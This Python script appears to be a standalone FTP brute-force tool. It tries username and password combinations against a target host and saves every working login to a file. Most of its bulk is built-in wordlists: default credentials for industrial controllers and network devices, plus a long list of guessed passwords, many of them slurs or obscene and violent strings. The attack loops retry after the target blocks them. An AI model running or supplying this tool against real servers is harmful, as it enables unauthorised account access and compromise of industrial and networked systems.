import sys
import socket
import ftplib
import random
import os
import time
try:
	import argparse
except:
	os.system('pip install argparse')
try:
	from colorama import Fore as fore
except:
	os.system('pip install colorama')
from colorama import Fore as fore
W=fore.WHITE
R=fore.RED
G=fore.GREEN
B=fore.LIGHTBLUE_EX
users=[]
ifb=[]
__userlists__=['anonymous', 'admin', 'ftp', 'root', 'localadmin', 'apc', 'Root', 'user', 'MELSEC', 'QNUDECPU', 'ftp_boot', 'uploader', 'ftpuser', 'qbf77101', 'ntpupdate', 'sysdiag', 'wsupgrade', 'pcfactory', 'loader', 'test', 'webserver', 'fdrusers', 'nic2212', 'Admin', 'User', 'Guest', 'adtec', 'none', 'instrument', 'default', 'nmt', 'supervisor', 'user1', 'avery', 'IEIeMerge', 'eMerge', 'ADMIN', 'beijer', 'se', 'su', 'MayGion', 'PlcmSpIp', 'device', 'adminaccount', 'dmftp', 'dm', 'httpadmin', 'adminadmin', 'administrator', 'adminman', 'adminme', 'adminmen', 'adminpass', 'adminroot', 'admins', 'adminsuper', 'adminuser', 'adminweb', 'host', 'hosts', 'msfadmin', 'redaktur', 'root', 'rootaccount', 'rootadmin', 'rootme', 'rootname', 'rootpass', 'rootroot', 'roots', 'rootsuper', 'rootuser', 'rootweb', 'super', 'superaccount', 'superadmin', 'superme', 'superoot', 'superroot', 'supers', 'supersuper', 'superweb', 'toor', 'user', 'useraccount', 'useradmin', 'userman', 'userme', 'usermen', 'username', 'useroot', 'userpass', 'userroot', 'users', 'usersuper', 'useruser', 'userweb', 'john', 'nathan', 'nicolai', 'nicolas', 'nichole', 'nicholai', 'nicholas', 'jimmy', 'timmy', 'zeus', 'kratos', 'harry', 'herry', 'tina', 'account', 'suspended', 'master', 'eliot', 'elliot', 'ander', 'timber', 'amber', 'anderson', 'johny', 'johnson', 'jack', 'jacky', 'lee']
__passlists__=['anonymous', 'b1uRR3', '1234', 'stingray', 'apc', 'fhttpadmin', 'system', 'MELSEC', 'QNUDECPU', 'ftp_boot', 'ZYPCOM', 'password', 'hexakisoctahedron', 'ntpupdate', 'factorycast@schneider', 'wsupgrade', 'pcfactory', 'fwdownload', 'testingpw', 'webpages', 'sresurdf', 'poiuypoiuy', 'ko2003wa', 'maygion.com', 'PlcmSpIp', '998', '12hrs37', 'rootpasswd', 'admin', 'ftp', 'Janitza', 'supervisor', 'pass1', 'avery', 'eMerge', 'avery', 'beijer', 'none', 'admin1234', 'dpstelecom', 'instrument', 'default', '1234', 'localadmin', '!@#abc', '1234', 'apc', 'nas', 'wago', 'user', 'User', 'guest', 'wago', '##password', '##password##', '##password**', '##password@@', '#*password*#', '()password()', '**password', '**password##', '**password**', '**password@@', '00000000', '00001111', '00011000', '000111', '00110011', '009988', '00998877665544332211', '010101', '01010101', '013579', '02', '024680', '0987654321', '0two', '1', '101010', '10101010', '11001100', '110022', '11002299', '110022993388', '11002299338844', '1100229933884477', '110022993388447755', '11002299338844775566', '110022993388447766', '11002299338844776666', '123pass123', '123pass999', '123password123', '123password456', '123password666', '123password999', '13579', '135790', '21jumpstreet', '22jumpstreet', '2468', '24680', '2number2', '2number6', '2number6withextradip', '2number9',
 'afterit', 'agen007', 'agustus', 'aiplusplus', 'alanwalker', 'alanwalker007', 'alanwalker123', 'alber666', 'albert', 'albert01', 'albert123', 'albert135', 'albertein', 'alberteinstein', 'alien', 'aliens', 'allover', 'alloverhere', 'allow', 'allowme123', 'alone', 'alonely', 'already', 'alucard', 'alucard123', 'alucard135', 'alucard666', 'amblemm', 'amd', 'amdprocessor', 'amelia', 'amelia123', 'amelia12345', 'amelia13579', 'amsterdam', 'angel', 'angel123', 'angel666', 'angela', 'angela000', 'angela123', 'angela1233', 'angelina', 'angelo', 'angelo123', 'angeloman', 'angelopass', 'angle', 'anone', 'anonym', 'anonymous000', 'anonymous123', 'anonymous12345', 'anonymous666', 'anonymous@', 'anonymousadmin', 'anonymouse', 'anonymousmember', 'anthem', 'anthonio', 'anthony', 'anthonyo', 'antonio', 'antony', 'aplusplus', 'april', 'asdfghjkl', 'asdw123', 'askhim', 'askme', 'askmeplease', 'askthatguy', 'astronout', 'atom', 'atomic', 'august', 'awds123', 'awesome', 'ayeaye', 'ayeayeaye', 'backtrack', 'badass', 'badboy', 'badman', 'batlle', 'batman', 'battles', 'before_after', 'beforeandafter', 'begonethot', 'belly', 'bellypass', 'ben10', 'benefit', 'benefit666', 'benjamin', 'benten', 'bequit', 'berlin', 'berlyn', 'bernart', 'big', 'bigboob', 'bigboobs', 'bigger', 'bigsmoke', 'bill', 'billgates', 'billy', 'binary', 'binary01', 'binary10', 'binary123', 'bitch', 
 'bitch123', 'bitch12345', 'bitchplease', 'blackmarket', 'blackninja', 'blackpink', 'blogger', 'blueghost', 'blueman', 'bob', 'bob123', 'boby', 'boob', 'boobees', 'boobs', 'boombeach', 'boomboom', 'boy', 'boy123', 'boy12345', 'boy7', 'boyadmin', 'boyme', 'boypass', 'boyroot', 'boyseven', 'boyuser', 'boywater', 'break', 'breakbone', 'breaker', 'breakerheart', 'breakingnews', 'breakme', 'brick', 'bring', 'bringit', 'bringme', 'british', 'bro', 'broarmy', 'brofist', 'broke', 'brokehand', 'brokenheart', 'broker', 'broklyn', 'broman123', 'brook', 'brother', 'browser', 'browsing', 'bruno', 'bruno123', 'bruno135', 'bts_army', 'btsarmy', 'bullshit', 'burninghall', 'burningtown', 'bussinessman', 'bussinessonly', 'butiloveyou', 'cancer', 'canthackme', 'cantpass', 'capslock123', 'carl', 'carljohnson', 'carmaster', 'carol', 'caroline', 'caroll', 'carrol', 'cat', 'catmoon', 'century', 'charge123pass', 'charlie', 'chaseme', 'cheat123', 'cheater', 'cheater000', 'cheater123', 'cheater12345', 'cheater999', 'china', 'chinese', 'christ', 'christian', 'christian123', 'christianguy', 'christwalker', 'chromium', 'cinderella', 'clear', 'clearme', 'clearmind', 'clearpass', 'colai', 'colay', 'colhay', 'coli', 'colonel', 'colonel123', 'columbia', 'column', 'coly', 'configman', 'countonme', 'crack', 'cracked', 'crackedpass', 'crackedpassword', 'crackme', 'crackmeif', 
 'crackmeifyoucan', 'crazy', 'crazyman', 'credentia', 'credential', 'daisuki', 'daisuki123', 'daisuki666', 'daisukinandayo', 'damnass', 'dante', 'dante123pass', 'datingtime', 'debian', 'deepweb', 'deepweb123', 'deepweb123master', 'demon666', 'demonhunter', 'demonkill', 'denim', 'denim123', 'denimpass', 'denimpass123', 'denis', 'dennim', 'dennis', 'deny', 'denys', 'desember', 'devil', 'devil666', 'devilhunt', 'devilhunt123', 'devilhunter', 'devilhunter123', 'deviljin', 'devilkill', 'devilkiller', 'devilmaycry', 'devilsquad', 'diamond', 'diamondcraft', 'diamondminecraft', 'diana', 'dickhead', 'dinner', 'dinnertime', 'dirtymind', 'disgustang', 'disgusting', 'disismypass', 'disismypassword', 'dispassword', 'disstrack', 'distrack', 'distro', 'diyana', 'dmc', 'doesntexist', 'doesntmatter', 'doexist', 'dontexist', 'dontgo', 'dontgoaway', 'dontmind', 'dontmindme', 'dontpass', 'dontpassme', 'doujinshi', 'downcity', 'downtown', 'doyouthink', 'doyouthinkiknow', 'dudududu', 'dyana', 'dyane', 'easylemon', 'easypeezy', 'eatmyass', 'eatmypussy', 'echo', 'echo123', 'eclipse', 'eclipse123', 'edward', 'edward01', 'edward123', 'edwardpass', 'eliot', 'eliotanderson', 'eliteman', 'elliot', 'elliot123', 'elliotanderson', 'elliotpass', 'emblem', 'emily', 'eminem', 'emptymind', 'englan', 'england', 'englandismycity', 'eskeetit', 'esketiit', 'everybod', 'everybody', 'everyone', 'execute', 
 'exeman', 'exist', 'exploit', 
 'exploitmaster123', 'exploitnotworking', 'extract', 'extracthere', 'fabolous', 'facebook', 'fakeaccount', 'false', 'fanboy', 'fanny', 'fanny123', 'fanny135', 'father', 'february', 'fedora', 'finish', 'finnish', 'first', 'firstpass', 'firstpassword', 'fishing', 'flash', 'flash123', 'flashdisk', 'flashman', 'flashpass', 'flush', 'flushbrain', 'flusion', 'fool', 'fsocietu', 'fsociety', 'fuck', 'fuck_u', 'fuckoff', 'fuckthis', 'fuckthishit', 'fuckthisshit', 'fuckthisshitiamout', 'fuckyeah', 'fuckyou', 'fuckyoubitch', 'fullofnumber', 'gang', 'gay', 'gento', 'getaway', 'ghost', 'ghost123', 'ghost123pass', 'ghosthide', 'ghosthider', 'ghosthunter', 'ghostpass123', 'github', 'githubmaster', 'githubuser', 'giveme', 'givemeaccess', 'givemethat', 'godbless', 'goddamn', 'goddamnit', 'godhand', 'godofgame', 'godofwar', 'golddigger', 'goldigger', 'gonzales', 'gonzalez', 'good', 'googleaccount', 'googlepass', 'gotcha',
 'gotchaboi', 'gotchaboy', 'gov', 'goverment', 'govern', 'great', 'greater123', 'greatest', 'greenhero123', 'greenlantern', 'gretest', 'gucci', 'gucci_gang', 'guccigang', 'guessit', 'guessitman', 'guest', 'guests', 'hackboy', 'hacked', 'hackerman', 'hackermaster', 'hackermen', 'hacking', 'hackingworld', 'hackman', 'hackme', 'hackme123', 'hahahaha', 'hank', 'hanks', 'hat', 'hate', 'hater', 'haters', 'hateyou', 'headache', 'heknow', 'heknowit', 'hellyeah', 'help',
 'helpme', 'helpmepass', 'helpmepassword', 'hentai', 'hentai123', 'hentai12345', 'hentai4life', 'hentai666', 'hentai999', 'hentaiecchi', 'hentaiforlife', 'hentailoli', 'hentailovers', 'heybro', 'heysis', 'hidemaster', 'hobbit', 'hoe', 'holyshet', 'holyshit', 'hotman', 'hotman123', 'houleesheet', 'houmaygah', 'hunterman', 'huntermask', 'iamadmin', 'iamcoming', 'iamcuming', 'iamcumming', 'iamgamer', 'iamgay', 'iamhere', 'iamhomo', 'iamkiller', 'iamlesbi', 'iamlesbian', 'iamout', 'iamquit', 'iamroot', 'iamsuper', 'iamuser', 'iamyours', 'ichigo', 'idont', 'idontcare', 'idontcareandidontknow', 'idontfuckincare', 'idontfuckingcare', 'idontgiveafuck', 'idonthavepassword', 'idontknow', 'idontknowandidontcare', 'idontusepassword', 'idontwant', 'idontwantto', 'iforgetmypassword', 'ifuckinghateyou', 'ifuckinhateyou', 'ignoreme', 'ihateyou', 'ihopeyou', 'ihopeyoudont', 'ihopeyoudontknow', 'iko', 'iko_uwais', 'ikouwais', 'iliketokillyou', 'illuminati', 'illuminnati', 'illuminnatti', 'ilove69', 'iloveblack', 'iloveblackdick', 'iloveboob', 'iloveboobs', 'ilovedevil', 'ilovedick', 'ilovegame', 'ilovegames', 'ilovegithub', 'ilovehentai', 'iloveobama', 'iloveporn', 'ilovepussy', 'ilovesatan', 'ilovesex', 'ilovesixtynine', 'ilovetrump', 'iloveu', 'ilovevagina', 'ilovevegana', 'iloveyou', 'iloveyourmother', 'iluminati', 'iluminnati', 'immortal', 'imnotusepassword', 'imnotusingpassword', 'imsomnia', 'indonesia', 'infinite', 'infinity', 'instagrampass', 'instagrampassword', 'intel', 'inteli7', 'inteligent', 'inteliseven', 'intelmaster', 'intelprocessor', 'inthename', 'inthenameofjesuschrist', 'inthenameoflove', 'invinsible', 'invinsible123', 'isaac', 'islam', 'islamisbest', 'islamisthebest', 'isurelydontknow', 'itachi', 'ithink', 'ithinku', 'ithinkuknow', 'ithinkyou', 'ithinkyouknow', 'itseverydaybro', 'itsme', 'itsmypass', 'itsmypassword', 'iwantkillyou', 'iwanttokillyou', 'jack', 'jackass', 'jacksepticeye', 'jackson', 'jake', 'jakepaul', 'january', 'jesica', 'jesicca', 'jess', 'jessica', 'jessicca', 'jesus', 'jesuschrist', 'jesusismygod', 'jesusisourgod', 'jesusisyourgod', 'jimmy', 'jimmy123', 'jinkazama', 'john', 'john666', 'johnson', 'johnwick', 'johny', 'johny_cage', 'johnycage', 'johnyjohny', 'joseph', 'joshep', 'julia', 'julio', 'july', 'june', 'justanumber', 'justask', 'justice', 'justin', 'justin123', 'kakashi', 'kang', 'katapass', 'kataword', 'ken', 'kenny', 'kenny123', 'keyme', 'keyme000', 'keyme123', 'keypass', 'keypass000', 'keypass001', 'keypass123', 'keypassme', 'keytopass', 'keyword', 'keyword000', 'keyword001', 'keyword123', 'khan', 'killer', 'killerhunt', 'killerhunter', 'killmaster', 'kitana', 'kobe', 'kobe123', 'kobe666', 'kratos', 'kratosvszeus', 'kung', 'lao', 'lasagna', 'laughingishealthy', 'law', 'lawyer', 'leatherface', 'lee', 'lemmedie', 'leon', 'leonashley', 'lesbi', 'lesbian', 'letmedie', 'lewd', 'lewdgirl', 'lewdman', 'lewdme', 'lewdpass', 'lick', 'lickmyass', 'lickmydick', 'lickmypussy', 'life', 'lifeishard', 'ligma', 'ligma666', 'ligmadick', 'ligmadick666', 'lil', 'lil_pump', 'lilexe', 'lilpump', 'lilrap', 'lily', 'linux', 'lio', 'liu', 'logan', 'logan123', 'logan12345', 'loganpaul', 'lol', 'lol_pump', 'loli', 'lolicon', 'lolihentai', 'lolol', 'lololol', 'lolololol', 'lolpump', 'lolxd', 'lone', 'loneliness', 'lonely', 'lonewolf', 'lucid', 'luckas', 'luckass', 'lucknut', 'luckyou', 'luckyyou', 'luffy', 'lukas', 'mac', 'macos', 'mad', 'madafacka', 'maddog', 'magnificent', 'maigahh', 'major123', 'malcom', 'march', 'marchal', 'marketing', 'marketing123', 'marketing666', 'marketmaster', 'markiplier', 'markupbro', 'markupbro666', 'martin', 'martin123', 'martin135', 'martinpass', 'martiny', 'maskman', 'masterhack', 'masterhide', 'masterpiece', 'match', 'mate', 'may', 'mayopass123', 'me', 'meanwhile', 'meanwhile123', 'meanwhile666', 'megumin', 'megunime', 'megunime123', 'mei', 'meimei', 'memes', 'merlin', 'merlyn', 'metalman', 'metalslug', 'mey', 'miakhalifa', 'michael', 'milena', 'milfmom', 'millworm', 'milworm', 'mint', 'minusminus', 'mkiller', 'mobaanalog', 'mobilegend', 'mobilelegend', 'modern', 'modern123', 'monster123', 'monster123pass', 'monstercrazy', 'monsterpass123', 'mortal', 'mortal_kombat', 'mortalkombat', 'moshimoshi', 'mother', 'mothersucker', 'mr.robot', 'mrbean', 'mrblabla', 'mrrobot', 'ms17010', 'msfadmin', 'mtf', 'mtfucker', 'musclemania', 'musclemania123', 'muslem', 'muslim', 'my_instagram', 'my_pass', 'my_pass123', 'my_password', 'myadmin', 'mybirthday', 'mybirthdaydate', 'myinstagram', 'myman', 'mynameisjeff', 'mypass', 'mypassispass', 'mypassispassword', 'mypassword', 'mypasswordishere', 'mypasswordispassword', 'mypasswordissecret', 'mypasswordisthere', 'nanase', 'nandayo', 'nando', 'naruto', 'nathan', 'nathan123', 'neon', 'neon123', 'neon666', 'neronero', 'network', 'networkhack', 'networkhacker', 'networking', 'neverimagine', 'neverimaginebefore', 'nevermind', 'nevermind123', 'newpass', 'newpassword', 'newpasswordboi', 'newton', 'newton123', 'nicholai', 'nicholas', 'nicolai', 'nicolas', 'nicolhai', 'nigga', 'niggatryingtogetpassword', 'nikolai', 'nikolas', 'ninja', 'ninja123', 'ninja123pass', 'ninjahasligma', 'ninjapass', 'nobody', 'nobodylovesyou', 'nobodyloveyou', 'nomaden', 'nomind', 'nopass', 'nopass123', 'nopassword', 'nothing', 'nothing123', 'nothing12345', 'nothingpersonal', 'notime', 'notime123', 'notimeforthis', 'nottrue', 'november', 'nsaagent', 'nsagent', 'nsapassword', 'nsasecurity', 'nuclear123', 'number000', 'number123456789', 'number1to0', 'number1to9', 'number666', 'number6withextradip', 'number9withextradip', 'number_000', 'number_1to0', 'number_1to9', 'number_onetonine', 'number_onetozero', 'numberonetonine', 'numberonetozero', 'nurunuru', 'nurunurunuru', 'october', 'officer', 'official', 'ohmygah', 'ohmygawd', 'ohmygod', 'oishimanko', 'oldisgold', 'oldman', 'oldpass', 'oldpassword', 'omaigahh', 'onecan', 'onechaan', 'onechan', 'onee-chan', 'oneechan', 'onepiece', 'onican', 'onichaan', 'onichan', 'onii-chan', 'oniican', 'oniichan', 'online', 'ooohhh', 'ooooohhh', 'ooooohhhhh', 'openmind', 'ora', 'orra', 'orrraaa', 'p455w0rd', 'p455word', 'p45sw0rd', 'p45sword', 'p4s5w0rd', 'p4ssword', 'pa55w0rd', 'pa55word', 'pa5sw0rd', 'package', 'packing', 'pas5w0rd', 'pas5word', 'pass', 'pass##', 'pass**', 'pass123google', 'pass123john', 'pass123pass', 'pass4all', 'pass4allaccount', 'pass4you', 'pass@@', 'passandi', 'passed', 'passes', 'passgoogle', 'passhahaha', 'passhelp', 'passme', 'passme123', 'passmehelp', 'passmeif', 'passmeifyoucan', 'passmeplease', 'passpass', 'passphrase', 'passsandi', 'passthrough', 'passw0rd', 'password##', 'password**', 'password4all', 'password4allaccount', 'password@@', 'passwordaccount', 'passwordhelp', 'passwordinpassword', 'passwordishahaha', 'passwordisinmyhead', 'passwordispassword', 'passyoutube', 'pastme', 'paul', 'pedofil', 'pedoguy', 'pedoman', 'pedophill', 'pentagon', 'pento', 'perl', 'pewdiepie', 'phantom', 'phantom123', 'phrase', 'phraseme', 'phrases', 'phraseword', 'pi', 'piraspberry', 'plaintext', 'please', 'plusplus', 'pornhub', 'pornhubuser', 'psycho', 'psychopat', 'psychopath', 'pussy', 'pussy123', 'pussy12345', 'pussyweet', 'pussywet', 'python', 'qwerty123', 'qwerty12345', 'qwertyui123', 'qwertyui12345', 'qwertyuiop12345', 'qwertyuiop123456789', 'qwertyuiop1234567890', 'raiden', 'raider', 'random', 'randomnumber', 'rape', 'rapeme', 'raper', 'rapper', 'raspberry', 'raspberrypi', 'reality', 'recycle123', 'recyclepass', 'regenerator', 'reload', 'reload123', 'remember', 'rememberme', 'replay', 'residentevil', 'ringmaster', 'rock', 'rockyou', 'root', 'rootadmin', 'rootman', 'rootme', 'rootmen', 'rootoot', 'rootroot', 'rootsuper', 'rootuser', 'roronoa', 'roronoazoro', 'rusia', 'russia', 'russian', 'saitama', 'sakura', 'salmon', 'sam', 'samm', 'samsung', 'samuel', 'samueljackson', 'samuelljackson', 'sandwitch', 'sanji', 'santa', 'santa123', 'santa666', 'santaclaus', 'santaclause', 'santanic', 'santasatan', 'sasuke', 'satan', 'satan123', 'satan666', 'satan6969', 'satan999', 'satanangel', 'satanic', 'satanic666', 'satanic999', 'satankill', 'sayitone', 'sayitonemoretime', 'scorpion', 'second', 'secret123', 'securityisfake', 'selenium', 'september', 'sheknow', 'sheknowit', 'shittalker', 'shittymaster', 'shittymouth', 'shutthefuckup', 'shutup', 'silent', 'silent123', 'silent666', 'silenthill', 'silentkill', 'siscon', 'sister', 'skin', 'skinny', 'skinnyfab', 'slav', 'slavmeme', 'slavmemes', 'sleepingbeauty', 'smith', 'snowden', 'sofunny', 'solo', 'solololo', 'sololololo', 'sonofabitch', 'spacepass', 'spaceship', 'specify', 'specifyi', 'specifyit', 'squirt', 'standing', 'standstill', 'standstill666', 'start', 'stayaway', 'stephan', 'stop', 'sub-zero', 'suckmyass', 'suckmydick', 'suckmypussy', 'sugar', 'sugar123', 'sugarpop123', 'summer', 'summerpass', 'super', 'super123', 'superaccess', 'superadmin', 'superbad', 'superbat', 'superior', 'superman', 'superme', 'supermen', 'superoot', 'superpass', 'superroot', 'supersecure', 'supersecure000', 'supersecure123', 'supersecurity', 'supersuper', 'superuser', 'sweeden', 'tangled', 'testingaccount', 'text123', 'textpack', 'thanos', 'thanos123', 'thatsmynigga', 'thepass', 'thepassword', 'thepasswordis', 'thepasswordisinmyhead', 'thepasswordispassword', 'theraid', 'thinkit', 'thisismypass', 'thisismypassword', 'thisispassword', 'thispassword', 'through', 'through123', 'tim', 'timmy', 'tinkerbell', 'tom', 'tom123', 'tomcat123', 'tomcat666', 'torbrowser', 'toxickill', 'toxickiller', 'trashtalker', 'travic', 'true', 'tuvac', 'twonumber6', 'twonumberninewithextradip', 'ubuntu', 'underground', 'unix', 'unlock', 'unlocked', 'unmad', 'unnormal', 'unormal', 'unpacking', 'update', 'upline', 'uroboros', 'usbrubber', 'usbrubberducky', 'user', 'user123', 'user12345', 'user666', 'user999', 'useraccount', 'useradmin', 'userman', 'userme', 'useroot', 'userroot', 'usersuper', 'useruser', 'vape', 'vegas', 'venom', 'venom123', 'vibrator', 'viper', 'vsauce', 'wadefuck', 'waiter', 'waitforme', 'walrus', 'walrus123', 'watashi', 'watashi-wibu', 'watashiwibu', 'watashiwibu-kun', 'watashiwibukun', 'water123', 'water123pass', 'wateraqua', 'wateraqua123', 'waterboy', 'waterman', 'waterpass', 'waterpass123', 'wathefuck', 'watthefuck', 'wegothim', 'wegotyou', 'welltry', 'welltrybro', 'welltrybrother', 'welltrybuddy', 'wetpussy', 'what', 'whatareyou', 'whatareyoutalking', 'whatareyoutalkingabout', 'whatdefuck', 'whatdoyouthink', 'whathefuck', 'whatis', 'whatisdis', 'whatisthis', 'whatsapp', 'whatthefuck', 'who', 'whoam', 'whoami', 'whoamu', 'whoamyou', 'whoare', 'whoareyou', 'wick', 'wicky', 'will', 'will123', 'william', 'william123', 'williamsmith', 'window', 'windows', 'winter', 'winter123', 'wirehsarkmaster', 'wkwkwkwk', 'wkwkwkwkwk', 'wobwideworld', 'wolf', 'wolfeinstein', 'wordpass', 'wordword', 'worldwideweb', 'wormdeath', 'wrong', 'wrongpass', 'wwe', 'wwe123', 'www', 'www123', 'www123www', 'xmen', 'xnxx', 'xnxxuser', 'xvideos', 'xvideos_user', 'yakuza', 'yakuza123pass', 'yakuza666', 'yeahi', 'yeahiwill', 'yeahwill', 'yesbro', 'yesbro123', 'yesir', 'yesmam', 'yesmam123', 'yesmom', 'yesmom123', 'yespapa', 'yessir', 'yesyouknow', 'youdontknow', 'youdontknowit', 'youfool', 'youfunny', 'youknow', 'youknowit', 'youknowthat', 'youknowwhat', 'yourfather', 'yourfatherknow', 'yourmomass', 'yourmompussy', 'yourmother', 'yourmotherknow', 'yourpasswordisincorrect', 'youshallnotpass', 'youshouldknow', 'yousonofabitch', 'youthinkiwill', 'youtube', 'youtube123', 'youtube123pass', 'youtubeaccount', 'youtubecontent', 'youtubepass', 'youtuber', 'youtuber123', 'youtuberpass', 'youtubers', 'zero', 'zero000', 'zero1', 'zero123', 'zero2', 'zerois1', 'zerotwo', 'zerozero',
 'zeus', 'zeusvskratos', 'zoro', 'zoro123', 'zoro666', 'zorro', 'zxcvbnm', 'welcome', 'welcome123', '@dm1n', '@DM1N', 'admin@database', 'admin@db', 'admin_db', 'user_db', 'user@database', 'u53r', 'u5er', 'U53R', 'U53r', 'U5ER', 'U5eR', 'U5Er', 'U5er', 'user_bd', 'usersploit', 'hackedaccount', 'database1', 'database2', 'database3', 'database01', 'database02', 'database03']
def ckeak_file(file):
	try:
		file=open(file,'r')
	except:
		print(R+f'[!] This file not found ({file})'+W)
		sys.exit()
#ckeak_file('file.txt')
def ftp_brute_user_plist(__host__,__port__,userlist,passwd,times):
	ckeak_file(userlist)
	user_list=open(userlist,'r').readlines()
	print(W+f'''
{B}[+]{W} host : {__host__}
{B}[+]{W} port : {str(__port__)}
{B}[+]{W} timeout : {str(times)}
{B}[+]{W} userlist : {userlist}
{B}[+]{W} password : {passwd}
	''')
	for i in  user_list:
		i=i.strip()
		users.append(i)
	for user in users:
		user=user.strip()
		try:
			ftp=ftplib.FTP()
			ftp.connect(__host__,__port__,timeout=times)
			ftp.login(user,passwd)
			ftp.quit()
			print(G+f'[+] {W}login username {G}{user}  {W} password{G} {passwd}{W}')
			file=open(__host__+'.txt','a')
			file.write(f'\nusername : {user} password : {passwd} host :{__host__} port : {str(__port__)}\n')
			file.close()
		except KeyboardInterrupt:
			users.clear()
			break
			sys.exit()
		except ftplib.error_perm:
			print(W+f'[*] try login username{R} {user} {W}  password{R} {passwd}'+W)
			ifb.append('ftp')
		except ConnectionRefusedError:
			if len(ifb) != 0:
				print(R+f'[!] block port {str(__port__)} sleep 10 Seconds'+W)
				time.sleep(10)
				continue
			if len(ifb) == 0:
				print(R+f'[!] port({str(__port__)}) Error ')
				sys.exit()
		except OSError:
			if len(ifb) != 0:
				print(R+f'[!] block {__host__}:{str(__port__)} sleep 10 Seconds'+W)
				time.sleep(10)
				continue
			if len(ifb) == 0:
				print(R+f'[!] Error ip address {__host__}:{str(__port__)}')
				sys.exit()
		except Exception as ex:
			print(R+'[!] '+str(ex))
def ftp_brute_j_login(__host__,__port__,username,password,times):
	print(W+f'''
{B}[+]{W} host : {__host__}
{B}[+]{W} port : {str(__port__)}
{B}[+]{W} timeout : {str(times)}
{B}[+]{W} username : {username}
{B}[+]{W} password : {password}
	''')
	try:
		ftp=ftplib.FTP()
		ftp.connect(__host__,__port__,timeout=times)
		ftp.login(username,password)
		ftp.quit()
		print(G+f'[+] {W}login username {G}{username}  {W} password{G} {password}{W}')
		file=open(__host__+'.txt','a')
		file.write(f'\nusername : {username} password : {password} host :{__host__} port : {str(__port__)}\n')
		file.close()
	except KeyboardInterrupt:
		sys.exit()
	except ftplib.error_perm:
		print(W+f'[*] try login username{R} {username} {W}  password{R} {password}'+W)
		ifb.append('ftp')
	except ConnectionRefusedError:
		print(R+f'[!] port({str(__port__)}) Error ')
		sys.exit()
	except OSError:
		print(R+f'[!] Error ip address {__host__}:{str(__port__)}')
		sys.exit()
	except Exception as ex:
		print(R+'[!] '+str(ex))
def ftp_brute_user_plist_user(__host__,__port__,username,passlist,times):
	ckeak_file(passlist)
	__passlist__=open(passlist,'r').readlines()
	print(W+f'''
{B}[+]{W} host : {__host__}
{B}[+]{W} port : {str(__port__)}
{B}[+]{W} timeout : {str(times)}
{B}[+]{W} username : {username}
{B}[+]{W} passlist : {passlist}
	''')
	
	for pasw in __passlist__:
		pasw=pasw.strip()
		try:
			ftp=ftplib.FTP()
			ftp.connect(__host__,__port__,timeout=times)
			ftp.login(username,pasw)
			ftp.quit()
			print(G+f'[+] {W}login username {G}{username}  {W} password{G} {pasw}{W}')
			file=open(__host__+'.txt','a')
			file.write(f'\nusername : {username} password : {pasw} host :{__host__} port : {str(__port__)}\n')
			file.close()
		except KeyboardInterrupt:
			users.clear()
			break
			sys.exit()
		except ftplib.error_perm:
			print(W+f'[*] try login username{R} {username} {W}  password{R} {pasw}'+W)
			ifb.append('ftp')
		except ConnectionRefusedError:
			if len(ifb) != 0:
				print(R+f'[!] block port {str(__port__)} sleep 10 Seconds'+W)
				time.sleep(10)
				continue
			if len(ifb) == 0:
				print(R+f'[!] port({str(__port__)}) Error ')
				sys.exit()
		except OSError:
			if len(ifb) != 0:
				print(R+f'[!] block {__host__}:{str(__port__)} sleep 10 Seconds'+W)
				time.sleep(10)
				continue
			if len(ifb) == 0:
				print(R+f'[!] Error ip address {__host__}:{str(__port__)}')
				sys.exit()
		except Exception as ex:
			print(R+'[!] '+str(ex))
def ftp_brute(__host__,__port__,userlist,passlist,times):
	ckeak_file(userlist)
	ckeak_file(passlist)
	user_list=open(userlist,'r').readlines()
	pass_list=open(passlist,'r').readlines()
	print(W+f'''
{B}[+]{W} host : {__host__}
{B}[+]{W} port : {str(__port__)}
{B}[+]{W} timeout : {str(times)}
{B}[+]{W} userlist : {userlist}
{B}[+]{W} passlist : {passlist}
	''')
	for i in  user_list:
		i=i.strip()
		users.append(i)
	for user in users:
		user=user.strip()
		for pasw in pass_list:
			pasw=pasw.strip()
			try:
				ftp=ftplib.FTP()
				ftp.connect(__host__,__port__,timeout=times)
				ftp.login(user,pasw)
				ftp.quit()
				print(G+f'[+] {W}login username {G}{user}  {W} password{G} {pasw}{W}')
				file=open(__host__+'.txt','a')
				file.write(f'\nusername : {user} password : {pasw} host :{__host__} port : {str(__port__)}\n')
				file.close()
			except KeyboardInterrupt:
				users.clear()
				break
				sys.exit()
			except ftplib.error_perm:
				print(W+f'[*] try login username{R} {user} {W}  password{R} {pasw}'+W)
				ifb.append('ftp')
			except ConnectionRefusedError:
				if len(ifb) != 0:
					print(R+f'[!] block port {str(__port__)} sleep 10 Seconds'+W)
					time.sleep(10)
					continue
				if len(ifb) == 0:
					print(R+f'[!] port({str(__port__)}) Error ')
					sys.exit()
			except OSError:
				if len(ifb) != 0:
					print(R+f'[!] block {__host__}:{str(__port__)} sleep 10 Seconds'+W)
					time.sleep(10)
					continue
				if len(ifb) == 0:
					print(R+f'[!] Error ip address {__host__}:{str(__port__)}')
					sys.exit()
			except Exception as ex:
				print(R+'[!] '+str(ex))
def ftp_brtue_aup(__host__,__port__,times):
	print(W+f'''
{B}[+]{W} host : {__host__}
{B}[+]{W} port : {str(__port__)}
{B}[+]{W} timeout : {str(times)}
{B}[+]{W} userlist : __userlists__
{B}[+]{W} passlist : __passlists__
	''')
	for user in __userlists__:
		user=user.strip()
		for pasw in __passlists__:
			pasw=pasw.strip()
			try:
				ftp=ftplib.FTP()
				ftp.connect(__host__,__port__,timeout=times)
				ftp.login(user,pasw)
				ftp.quit()
				print(G+f'[+] {W}login username {G}{user}  {W} password{G} {pasw}{W}')
				file=open(__host__+'.txt','a')
				file.write(f'\nusername : {user} password : {pasw} host :{__host__} port : {str(__port__)}\n')
				file.close()
			except KeyboardInterrupt:
				users.clear()
				break
				sys.exit()
			except ftplib.error_perm:
				print(W+f'[*] try login username{R} {user} {W}  password{R} {pasw}'+W)
				ifb.append('ftp')
			except ConnectionRefusedError:
				if len(ifb) != 0:
					print(R+f'[!] block port {str(__port__)} sleep 10 Seconds'+W)
					time.sleep(10)
					continue
				if len(ifb) == 0:
					print(R+f'[!] port({str(__port__)}) Error ')
					sys.exit()
			except OSError:
				if len(ifb) != 0:
					print(R+f'[!] block {__host__}:{str(__port__)} sleep 10 Seconds'+W)
					time.sleep(10)
					continue
				if len(ifb) == 0:
					print(R+f'[!] Error ip address {__host__}:{str(__port__)}')
					sys.exit()
			except Exception as ex:
				print(R+'[!] '+str(ex))			
##### userlist! -- auto passlist
